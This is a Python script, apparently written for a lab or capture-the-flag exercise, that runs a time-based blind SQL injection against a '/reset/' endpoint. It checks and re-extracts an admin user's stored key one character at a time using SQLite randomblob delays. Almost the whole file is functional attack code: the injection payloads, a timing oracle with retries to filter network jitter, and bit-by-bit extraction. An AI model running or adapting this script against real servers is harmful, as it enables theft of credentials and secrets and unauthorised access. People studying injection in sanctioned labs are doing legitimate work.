import requests
import time

# ============================================================
# TARGET CONFIGURATION
# Replace with the target server URL in a controlled lab environment
# ============================================================
TARGET_URL = "http://target-server.example.com:3030/"


class ExtractionVerifier:
    """
    Verifies and error-corrects a previously extracted string by re-querying
    the database for each character position that appears suspicious.

    Motivation:
        Time-based blind SQL injection is inherently noisy - network jitter
        can cause a TRUE condition to look like FALSE (missed delay) or vice
        versa. Rather than re-extracting everything from scratch, this class
        performs a targeted verification pass:

        1. For each character in the extracted string, inject a condition that
           tests whether the character does NOT match the expected value.
        2. If the server responds slowly (TRUE = mismatch confirmed), re-extract
           that character using high-confidence bit sampling.
        3. Save the corrected output.
    """

    def __init__(self, server, delay_size=60_000_000):
        self.server = server
        self.delay_size = delay_size
        self.threshold = 0.42

    def _send_injection(self, injection):
        """Send a single injection payload and return response time in seconds."""
        start = time.time()
        try:
            requests.post(
                url=self.server + "/reset/",
                data={"username": injection},
                timeout=30
            )
            return time.time() - start
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            return None

    def _character_matches(self, position, expected_char, num_samples=1):
        """
        Check whether the character at a given position matches our expectation.

        Injects a NOT-EQUAL condition: if the server delays, the character
        does NOT match; if the response is fast, it does match. The NOT condition
        is robust to network processing spikes, double checking false positives
        (correct key characters marked as incorrect)

        Args:
            position:      1-based index of the character to verify
            expected_char: The character we expect to find
            num_samples:   Initial number of verification attempts

        Returns:
            bool: True if the character matches, False if a mismatch is detected
        """
        ascii_val = ord(expected_char)
        injection = (
            f"admin' AND "
            f"(unicode(substr((select key from users where username='admin'), "
            f"{position}, 1)) != {ascii_val}) "
            f"AND randomblob({self.delay_size}) AND '1'='1"
        )

        for _ in range(num_samples):
            elapsed = self._send_injection(injection)
            time.sleep(0.1)
            if elapsed is None:
                continue

            if elapsed > self.threshold:
                # Slow response = NOT-EQUAL is TRUE = mismatch detected
                # Retry 3 times before committing to a mismatch verdict
                for _ in range(3):
                    elapsed = self._send_injection(injection)
                    time.sleep(0.1)
                    if elapsed is not None and elapsed < self.threshold:
                        return True  # Fast on retry = likely a network spike, character matches
                return False  # Consistently slow = genuine mismatch

        return True  # All fast = character matches

    def _extract_bit(self, char_position, bit_position, num_samples=7):
        """Extract a single bit with high confidence (more samples than the main extractor)."""
        injection = (
            f"admin' AND "
            f"((unicode(substr((select key from users where username='admin'), "
            f"{char_position}, 1)) >> {bit_position}) & 1 = 1) "
            f"AND randomblob({self.delay_size}) AND '1'='1"
        )

        for _ in range(num_samples):
            elapsed = self._send_injection(injection)
            time.sleep(0.1)
            if elapsed is not None and elapsed < self.threshold:
                return 0
        return 1

    def _extract_character(self, position, num_samples=7):
        """Re-extract a single character with high confidence."""
        bits = [str(self._extract_bit(position, bit_idx, num_samples))
                for bit_idx in range(7, -1, -1)]

        binary_string = ''.join(bits)
        char_code     = int(binary_string, 2)
        character     = chr(char_code)

        print(f"  Re-extracted position {position}: {binary_string} = {char_code} = '{character}'")
        return character

    def verify_and_correct(self, input_file, output_file="verified_output.txt"):
        """
        Run a full verification pass over a previously extracted string.

        Reads the extracted string from input_file, verifies each character,
        re-extracts any mismatches with high confidence, and saves the result.

        Args:
            input_file:  Path to the file containing the original extracted string
            output_file: Path to write the corrected string

        Returns:
            tuple: (corrected_string, list_of_mismatch_positions)
        """
        with open(input_file, "r", encoding="utf-8") as f:
            extracted = f.read()

        print(f"Loaded {len(extracted)} characters from '{input_file}'")
        print("Starting verification pass...\n")

        corrected  = ""
        mismatches = []

        for position in range(1, len(extracted) + 1):
            expected = extracted[position - 1]

            if position % 50 == 0:
                print(f"\n--- Progress: {position}/{len(extracted)} verified | "
                      f"Mismatches so far: {len(mismatches)} ---")
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(corrected)

            print(f"Position {position:4d}: checking '{expected}' (ASCII {ord(expected)})", end=" ... ")
            is_correct = self._character_matches(position, expected)

            if is_correct:
                print("OK")
                corrected += expected
            else:
                print("MISMATCH - re-extracting...")
                mismatches.append(position)
                corrected_char = self._extract_character(position)
                print(f"  Corrected: '{expected}' -> '{corrected_char}'")
                corrected += corrected_char

            time.sleep(0.2)

        with open(output_file, "w", encoding="utf-8") as f:
            f.write(corrected)

        print("\n" + "=" * 60)
        print("VERIFICATION COMPLETE")
        print("=" * 60)
        print(f"Total characters verified: {len(extracted)}")
        print(f"Mismatches corrected:      {len(mismatches)}")
        if mismatches:
            shown = mismatches[:20]
            print(f"Mismatch positions:        {shown}"
                  + (f" ... and {len(mismatches) - 20} more" if len(mismatches) > 20 else ""))
        print(f"Corrected output saved to: {output_file}")
        print("=" * 60)

        return corrected, mismatches


def main():
    verifier = ExtractionVerifier(server=TARGET_URL, delay_size=60_000_000)

    corrected, mismatches = verifier.verify_and_correct(
        input_file="extracted_output.txt",
        output_file="verified_output.txt"
    )

    print(f"\nVerification complete. {len(mismatches)} character(s) were corrected.")


if __name__ == "__main__":
    main()
